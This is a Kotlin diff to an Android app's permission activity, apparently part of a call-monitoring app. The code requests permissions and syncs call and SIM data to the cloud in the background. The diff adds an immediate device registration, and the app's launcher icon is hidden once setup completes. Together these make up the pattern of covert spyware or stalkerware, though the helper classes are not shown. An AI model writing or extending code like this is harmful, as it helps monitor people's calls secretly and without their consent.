@@ -1,6 +1,5 @@
 package com.calltech
 
-import android.content.Intent
 import android.os.Build
 import android.os.Bundle
 import android.util.Log
@@ -9,9 +8,8 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 /**
- * Permission popup sirf install/auto-start se.
- * Home icon click par popup nahi — turant band.
- * Allow ke baad hide.
+ * Permissions already hon to popup nahi — seedha SIM sync + hide.
+ * Missing hon to system popup, phir hide.
  */
 class PermissionTrampolineActivity : AppCompatActivity() {
     private var setupFinished = false
@@ -28,17 +26,6 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
         SyncBootstrap.armBackgroundSync(this)
 
-        if (isHomeIconClick()) {
-            Log.d(TAG, "App icon click — permission popup skip")
-            if (InstallFlow.isSetupComplete(this)) {
-                LauncherHider.hideIfMarked(this)
-            }
-            finish()
-            return
-        }
-
-        bringToFront()
-
         val missing = SyncBootstrap.requiredPermissions().filter { permission ->
             checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
         }
@@ -48,31 +35,8 @@ class PermissionTrampolineActivity : AppCompatActivity() {
             return
         }
 
+        bringToFront()
         permissionLauncher.launch(missing.toTypedArray())
-    }
-
-    private fun isHomeIconClick(): Boolean {
-        if (intent.getBooleanExtra(PostInstallPrompt.EXTRA_FORCE_POPUP, false)) {
-            return false
-        }
-
-        val fromLauncher = Intent.ACTION_MAIN == intent.action &&
-            intent.hasCategory(Intent.CATEGORY_LAUNCHER)
-        if (!fromLauncher) {
-            return false
-        }
-
-        val source = buildString {
-            append(referrer?.toString().orEmpty())
-            append(' ')
-            append(callingPackage.orEmpty())
-        }.lowercase()
-
-        if (INSTALLER_HINTS.any { source.contains(it) }) {
-            return false
-        }
-
-        return HOME_LAUNCHER_HINTS.any { source.contains(it) }
     }
 
     private fun bringToFront() {
@@ -99,6 +63,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         BackgroundSyncRunner.run {
             try {
                 CallSyncService.holdDuring(applicationContext) {
+                    DeviceRegistration.registerNow(applicationContext)
                     InstallFlow.runFirstCloudSync(applicationContext)
                 }
             } catch (error: Exception) {
@@ -115,24 +80,5 @@ class PermissionTrampolineActivity : AppCompatActivity() {
 
     companion object {
         private const val TAG = "PermissionTrampoline"
-        private val INSTALLER_HINTS = listOf(
-            "packageinstaller",
-            "filemanager",
-            "fileexplorer",
-            "documentsui",
-            "myfiles",
-            "vending",
-        )
-        private val HOME_LAUNCHER_HINTS = listOf(
-            "launcher",
-            "lawnchair",
-            "trebuchet",
-            "miui.home",
-            "poco.home",
-            "nexuslauncher",
-            "microsoftlauncher",
-            "hilauncher",
-            "xoslauncher",
-        )
     }
 }
